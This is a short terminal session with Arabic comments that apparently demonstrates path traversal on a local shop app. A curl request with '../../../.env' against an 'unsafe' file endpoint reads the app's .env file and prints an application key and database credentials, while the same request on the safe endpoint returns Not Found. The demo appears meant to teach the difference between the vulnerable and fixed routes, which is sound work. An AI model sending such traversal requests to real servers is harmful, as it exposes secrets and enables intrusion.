# ملف عام
$ curl -s localhost:8000/api/unsafe/files/terms.txt
شروط البيع: الأسعار تشمل الضريبة؛ والإرجاع خلال 14 يوماً.
# الصعود خارج المجلد
$ curl -s --path-as-is localhost:8000/api/unsafe/files/../../../.env
APP_KEY=base64:FFPOXw1cq9rBN1/HQe6IkB+bRqYo+L3EIKKia8ZEe4M=
DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=shop
DB_USERNAME=bit
DB_PASSWORD=secret
# المسار نفسه، على المسار الآمن
$ curl -s --path-as-is localhost:8000/api/files/../../../.env -H 'Accept: application/json' | jq -c
{"message":"Not Found"}
